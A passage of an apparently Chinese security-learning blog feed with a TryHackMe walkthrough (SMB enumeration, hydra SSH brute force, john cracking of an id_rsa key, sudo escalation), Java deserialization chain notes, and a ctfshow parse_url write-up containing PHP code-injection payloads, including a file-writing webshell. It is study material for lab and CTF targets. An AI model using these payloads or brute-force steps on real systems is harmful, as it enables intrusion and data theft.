alt="image-20230531205923600"></p><p>如果序列化的类实现了<code>writeReplace</code>方法，将会在序列化过程中调用它进行检查，好巧不巧，在<code>POJONode</code>的父类<code>BaseJsonNode</code>中就实现了这个方法，在这个方法的调用过程中抛出了异常，使得序列化过程中断</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里的话是记录一下关于java反序列化的刷题&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(因为刚把一些链子给跟完)&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;东华杯ezgadget&quot;&gt;&lt;a href=&quot;#东华杯ezgadget&quot; class=&quot;headerlink&quot; title=&quot;东华</summary>
      
    
    
    
    
    <category term="java-反序列化题目" scheme="https://ke1nys.github.io/tags/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>thm-Basic Pentesting</title>
    <link href="https://ke1nys.github.io/posts/4f9775c1.html"/>
    <id>https://ke1nys.github.io/posts/4f9775c1.html</id>
    <published>2023-05-21T08:35:12.000Z</published>
    <updated>2023-05-21T14:28:20.543Z</updated>
    
    <content type="html"><![CDATA[<p>写这篇文章主要是为了记录一下学习，这个靶机里有好几个知识点是之前没学过的，然后就学习记录一下</p><p>老样子还是先扫一下端口</p><p><img src="../images/image-20230521164057332.png" alt="image-20230521164057332"></p><p>扫出了这些端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">22</span><br><span class="line">80</span><br><span class="line">139</span><br><span class="line">445</span><br><span class="line">8009</span><br><span class="line">8080</span><br></pre></td></tr></table></figure><p>接下来访问80端口</p><p><img src="../images/image-20230521164222216.png" alt="image-20230521164222216"></p><p>没收集到啥有用的信息，扫个目录看看</p><p><img src="../images/image-20230521164453614.png" alt="image-20230521164453614"></p><p>发现一个development目录  于是进行访问</p><p><img src="../images/image-20230521164535782.png" alt="image-20230521164535782"></p><p>发现两个文件</p><p>dev.txt</p><p><img src="../images/image-20230521164625273.png" alt="image-20230521164625273"></p><p>j.txt</p><p><img src="../images/image-20230521164734023.png" alt="image-20230521164734023"></p><p>所以我们在 dev 中打开这两个文本文件，我们可以看到消息是关于一些 apache struts 和 2.5.12 版本的，而 j.txt 文件是关于机器内部哈希密码的目录。所以现在让我们考虑一下 Apache struts 2.5.12 版本，我们用 google 搜索了 Apache struts 2.15.12 以找到一些漏洞，我们得到了一个可以利用的 Metasploit 模块，但在尝试之后并没有给我一个连接。</p><p>我们无法从 Metasploit 模块获得反向 shell</p><p>现在让我们回到 Nmap 脚本，结果显示我们打开了 SMB 端口，我们也有 SMB 版本如果 SMB 版本存在漏洞，让我们谷歌一下</p><p>经过一些研究，我们得到了 <strong>Enum4linux—— <em>Enum4linux</em></strong>是一个用于从 Windows 和 <strong>Samba</strong> 系统枚举信息的工具。</p><p>所以现在我们可以运行命令“Enum4linux -a ipaddress”</p><p><img src="../images/image-20230521165356870.png" alt="image-20230521165356870"></p><p>成功找到这两个用户名，这里还有一种方法就是尝试一一下<strong>smb匿名用户登录</strong></p><p><code>smbclient //10.10.245.61/anonymous</code></p><p><img src="../images/image-20230521165706991.png" alt="image-20230521165706991"></p><p>直接匿名登录成功了</p><p><img src="../images/image-20230521165802097.png" alt="image-20230521165802097"></p><p>这也可以成功拿到名字，接下来就是尝试爆破ssh密码了</p><p>使用的是<code>hydra</code>工具  也叫九头蛇</p><p><img src="../images/image-20230521170726504.png" alt="image-20230521170726504"></p><p>使用这个工具，然后爆破出 <code>jan</code>的密码为<code>armando</code></p><p>于是进行登录</p><p><img src="../images/image-20230521170849656.png" alt="image-20230521170849656"></p><p>成功进行登录</p><p><img src="../images/image-20230521171014069.png" alt="image-20230521171014069"></p><p>发现jan用户没有权限查看kay用户目录下的文件，于是我们就尝试收集一些信息来尝试登录kay用户</p><p><img src="../images/image-20230521171101435.png" alt="image-20230521171101435"></p><p>发现存在<code>.ssh</code>文件</p><p>ssh进行免密登录的要求是<strong>私钥</strong>(<code>id_rsa</code>)要在客户段，<strong>公钥</strong>(<code>id_rsa.pub</code>)在服务端</p><p>在谷歌上搜索后我们知道这个 SSH 密钥可以用 John the ripper 破解。因此，让我们尝试破解 SSH 密钥。</p><p>所以首先我们必须找到 ssh2john.py 来转换哈希并将“id_rsa”文件内容作为文本文件复制并保存到我们的计算机，我们必须将文本文件转换为哈希格式你可以使用如图所示的命令在下图中</p><p><img src="../images/image-20230521172330697.png" alt="image-20230521172330697"></p><p>直接使用.ssh里的id_rsa是登不上去的，得需要john进行破解密码</p><p><img src="../images/image-20230521173041417.png" alt="image-20230521173041417"></p><p>这里是因为使用id_rsa受到密码保护，得输入密码才能使用，所以这里就得需要john进行密码的破解</p><p><strong>john的用法就是把需要破解的东西先转为它能识别的样子，然后在进行破解</strong></p><p>最后爆破出来的密码是<code>beeswax</code></p><p><img src="../images/image-20230521173425039.png" alt="image-20230521173425039"></p><p>成功进行登录</p><p><img src="../images/image-20230521173631270.png" alt="image-20230521173631270"></p><p>然后使用sudo -l来进行查看，发现kay用户可以访问所有的sudo命令</p><p><code>sudo su</code>进行提权</p><p><img src="../images/image-20230521173743387.png" alt="image-20230521173743387"></p><p><strong>总结</strong></p><p><strong>这里的学习到了遇到smb协议的时候该怎么办</strong></p><p><strong>还有使用john来破解id_rsa的使用密码</strong></p><p><strong>感觉john是不是啥密码都能进行爆破</strong> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写这篇文章主要是为了记录一下学习，这个靶机里有好几个知识点是之前没学过的，然后就学习记录一下&lt;/p&gt;
&lt;p&gt;老样子还是先扫一下端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230521164057332.png&quot; alt=&quot;image-2023</summary>
      
    
    
    
    
    <category term="thm-Basic Pentesting" scheme="https://ke1nys.github.io/tags/thm-Basic-Pentesting/"/>
    
  </entry>
  
  <entry>
    <title>show-代码执行</title>
    <link href="https://ke1nys.github.io/posts/2e4c90e3.html"/>
    <id>https://ke1nys.github.io/posts/2e4c90e3.html</id>
    <published>2023-05-20T13:06:08.000Z</published>
    <updated>2023-05-23T07:50:31.825Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="afd8626805df0a076cc1561e36377044514cd3054efa72ff9b16cd6df3a825e4"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-代码执行" scheme="https://ke1nys.github.io/tags/show-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化-cc2+cc4+cc5+cc7</title>
    <link href="https://ke1nys.github.io/posts/858f6c3d.html"/>
    <id>https://ke1nys.github.io/posts/858f6c3d.html</id>
    <published>2023-05-19T13:11:01.000Z</published>
    <updated>2023-05-21T14:28:20.538Z</updated>
    
    <content type="html"><![CDATA[<p>这里的话是导入cc4的maven依赖</p><p><img src="../images/image-20230521192554529.png" alt="image-20230521192554529"></p><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p>这里cc4和前面的不同是在调用<code>transform</code>方法的不同</p><p><img src="../images/image-20230521194855536.png" alt="image-20230521194855536"></p><p>然后就是接着找谁能调用这个<code>compare</code>方法了</p><p>根据发现这条链子的作者写的文章来看</p><p>入口点是<code>PriorityQueue</code>这个类</p><p><img src="../images/image-20230521195351157.png" alt="image-20230521195351157"></p><p>然后就到<code>heapify()</code></p><p><img src="../images/image-20230521195429690.png" alt="image-20230521195429690"></p><p>然后接着是<code>siftDown</code>函数</p><p><img src="../images/image-20230521195509503.png" alt="image-20230521195509503"></p><p>然后接着是<code>siftDownUsingComparator</code>函数</p><p><img src="../images/image-20230521195535898.png" alt="image-20230521195535898"></p><p>这里的话就和上面的方法对应上了</p><p>这里的话都是在<code>PriorityQueue</code>这个类里边进行调用那么因为<code>comparator</code>参数可控，所以就可以直接调用<code>TransformingComparator.compare()</code>方法了，然后就可以调用这个方法里边的<code>transform</code>方法了</p><p>最终目的都是为了调用到<code>ChainedTransformer.transform</code>方法</p><p>这里的话就会有疑问，就是为什么这里的链子在<strong>cc3</strong>里不能用，<code>PriorityQueue</code>是jdk里的类，那么出问题的肯定不是他，而是<code>TransformingComparator</code>这个类的问题</p><p><img src="../images/image-20230521202532028.png" alt="image-20230521202532028"></p><p><img src="../images/image-20230521202543387.png" alt="image-20230521202543387"></p><p>就是因为cc3里的这个类没有继承<code>serialize</code>所以就不能进行序列化操作，所以问题就出现在这里了</p><p>这里因为啥设的这些参数我这里就不写了  <a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=pageDriver&amp;vd_source=bacfffe46b930fda5761b63367eb298c">视频这里有讲</a></p><p><strong>接下来就懒得跟了，就是修改调用<code>transform</code>方法的变式罢了</strong></p><p><img src="../images/image-20221010090837206.png" alt="img"></p><p>就是跟着这张图片来找就行了</p><p>cc链子可以用很多种方法来互相组合来进行调用，就是可以用执行代码和调用<code>transform</code>的方法来进行排列组合掉用</p><p><strong>理论上应该只有1和3受jdk版本影响</strong></p><p><a href="http://miku233.viewofthai.link/2022/10/10/Commons-Collections2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">这是b站评论大佬写的总结</a></p><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=pageDriver&amp;vd_source=bacfffe46b930fda5761b63367eb298c">b站视频</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里的话是导入cc4的maven依赖&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230521192554529.png&quot; alt=&quot;image-20230521192554529&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;CC4&quot;&gt;&lt;a href=&quot;#CC4&quot;</summary>
      
    
    
    
    
    <category term="java反序列化-cc2+cc4+cc5+cc7" scheme="https://ke1nys.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc2-cc4-cc5-cc7/"/>
    
  </entry>
  
  <entry>
    <title>java-二次反序列化</title>
    <link href="https://ke1nys.github.io/posts/6c257651.html"/>
    <id>https://ke1nys.github.io/posts/6c257651.html</id>
    <published>2023-05-17T08:51:44.000Z</published>
    <updated>2023-05-17T12:28:35.161Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://tttang.com/archive/1701/#toc_">二次反序列化</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;http://tttang.com/archive/1701/#toc_&quot;&gt;二次反序列化&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="java-二次反序列化" scheme="https://ke1nys.github.io/tags/java-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-周末大挑战-parse_url</title>
    <link href="https://ke1nys.github.io/posts/153b575d.html"/>
    <id>https://ke1nys.github.io/posts/153b575d.html</id>
    <published>2023-05-15T09:42:21.000Z</published>
    <updated>2023-05-16T07:46:06.509Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://ctf-show.feishu.cn/docx/Al7GdBB5WoI9pMxod9acyzXFnfe">官方wp</a></p><p><strong>看了wp之后，学到了一个新技巧</strong></p><p>就是在<code>/</code>用不了的时候，我们可以使用先进行编码，然后在进行解码的方式来进行绕过</p><p>例如   <code>eval(base64_decode(&#39;c3lzdGVtKCJscyAvIik7&#39;));</code></p><p>这里的话先介绍一下这个<code>parse_url</code>函数</p><p>这里话在ctfshow的web入门里也有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://user:pass@host/path?args=value#anch&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果--------------------------------------------------------------------</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; host</span><br><span class="line">    [user] =&gt; user</span><br><span class="line">    [pass] =&gt; pass</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; args=value</span><br><span class="line">    [fragment] =&gt; anch</span><br><span class="line">)</span><br><span class="line">/path</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-10 10:58:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>这里的host的话就是<code>http://xxxx/</code>   里面的xxx，那么这里可控，于是就尝试看能不能进行命令执行</p><p><img src="../images/image-20230515175832497.png" alt="image-20230515175832497"></p><p>能成功进行命令执行，于是尝试文件读取</p><p><img src="../images/image-20230515180225448.png" alt="image-20230515180225448"></p><p>这是其中一种解法</p><p><strong>这里的 <code>/</code>用不了是因为在/的后面会被<code>parse_url</code>解析成path</strong></p><p><img src="../images/image-20230515180454024.png" alt="image-20230515180454024"></p><p>这是第二种解法</p><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-12 13:25:53</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>];</span><br></pre></td></tr></table></figure><p>做这里的时候可以使用bp来做，hackbar可能识别不成功</p><p>这里的想法是构造<code>php://input</code></p><p><img src="../images/image-20230516143313335.png" alt="image-20230516143313335"></p><p>这里的host是<code>php:</code>   path是<code>//input</code></p><p>然后就可以拼接成<code>include php://input</code>   、</p><p>然后在post执行代码就能够成功执行了</p><p><img src="../images/image-20230516143456418.png" alt="image-20230516143456418"></p><h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-12 13:29:18</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$data</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>];</span><br></pre></td></tr></table></figure><p>还是考察的拼接方法</p><p><img src="../images/image-20230516143959148.png" alt="image-20230516143959148"></p><p>本地尝试了一下</p><p><img src="../images/image-20230516144016789.png" alt="image-20230516144016789"></p><p>可以成功命令执行了</p><h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-12 13:29:35</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>还是先本地构造来进行尝试</p><p><img src="../images/image-20230516144313226.png" alt="image-20230516144313226"></p><p>这里发现成功后，这里不能用<code>/</code>的原因是因为会被识别成path</p><p><img src="../images/image-20230516144743961.png" alt="image-20230516144743961"></p><p>这里的话使用<code>$&#123;PWD::1&#125;</code>来替代<code>/</code>也行</p><p><img src="../images/image-20230516145016184.png" alt="image-20230516145016184"></p><p>不过这里的话要在这个<code>$&#123;PWD::1&#125;</code>的后面加上一个<code>:</code>,不然不会执行成功</p><h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-12 13:29:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]));</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$$$$$$host</span>;</span><br></pre></td></tr></table></figure><p>这里话<code>extract</code>，考察的是个变量覆盖的题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;Original&quot;</span>;</span><br><span class="line"><span class="variable">$my_array</span> = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;Dog&quot;</span>, <span class="string">&quot;c&quot;</span> =&gt; <span class="string">&quot;Horse&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$my_array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a = <span class="subst">$a</span>; \$b = <span class="subst">$b</span>; \$c = <span class="subst">$c</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果-------------------------------------------------------------------</span><br><span class="line"><span class="variable">$a</span> = Cat; <span class="variable">$b</span> = Dog; <span class="variable">$c</span> = Horse</span><br></pre></td></tr></table></figure><p>这就是这个函数的用法</p><p>就是把数组里的<code>key</code>作为变量名，把数组里的<code>value</code>作为变量的值</p><p>就是一个套娃的过程</p><p><img src="../images/image-20230516152003470.png" alt="image-20230516152003470"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$host</span>=scheme</span><br><span class="line"><span class="variable">$$host</span>=<span class="variable">$scheme</span>=user</span><br><span class="line"><span class="variable">$$$host</span>=<span class="variable">$user</span>=pass</span><br><span class="line"><span class="variable">$$$$host</span>=<span class="variable">$pass</span>=fragment</span><br><span class="line"><span class="variable">$$$$$host</span>=<span class="variable">$fragment</span>=query</span><br><span class="line"><span class="variable">$$$$$$host</span>=<span class="variable">$query</span>=php:<span class="comment">//input</span></span><br></pre></td></tr></table></figure><p>这里的话传入参数的时候要会<code>#</code>进行url编码</p><p><img src="../images/image-20230516152215558.png" alt="image-20230516152215558"></p><p><img src="../images/image-20230516152318971.png" alt="image-20230516152318971"></p><h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-12 13:29:18</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>], <span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>这里的话直接写php代码到文件里是不行的，因为存在的<code>?</code>会被识别成<code>query</code></p><p>我们就是用html文件中的&lt; script language=‘php’&gt;标签来实现php的代码。这里记住，只需写一个&lt; script&gt;，不需要写&lt; /scirpt&gt;，因为/还会被parse_url函数当作path中的内容。</p><p><img src="../images/image-20230516153311944.png" alt="image-20230516153311944"></p><p><img src="../images/image-20230516153607169.png" alt="image-20230516153607169"></p><p>最终paylaod</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=http:<span class="comment">//&lt;script+language=&quot;php&quot;&gt;system(&#x27;cd+..;cd+..;cd+..;cat+_f1a_g_1s_h3re&#x27;);:/var/www/html/1.php</span></span><br></pre></td></tr></table></figure><p>这里的话用之前的<code>$&#123;PWD::1&#125;</code>来替代<code>/</code>也是可以的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://ctf-show.feishu.cn/docx/Al7GdBB5WoI9pMxod9acyzXFnfe&quot;&gt;官方wp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;看了wp之后，学到了一个新技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;就是在&lt;code&gt;/&lt;</summary>
      
    
    
    
    
    <category term="ctfshow-周末大挑战-parse_url" scheme="https://ke1nys.github.io/tags/ctfshow-%E5%91%A8%E6%9C%AB%E5%A4%A7%E6%8C%91%E6%88%98-parse-url/"/>
    
  </entry>
  
  <entry>
    <title>java-RMI恶意服务</title>
    <link href="https://ke1nys.github.io/posts/7aace6cb.html"/>
    <id>https://ke1nys.github.io/posts/7aace6cb.html</id>
    <published>2023-05-14T08:03:03.000Z</published>
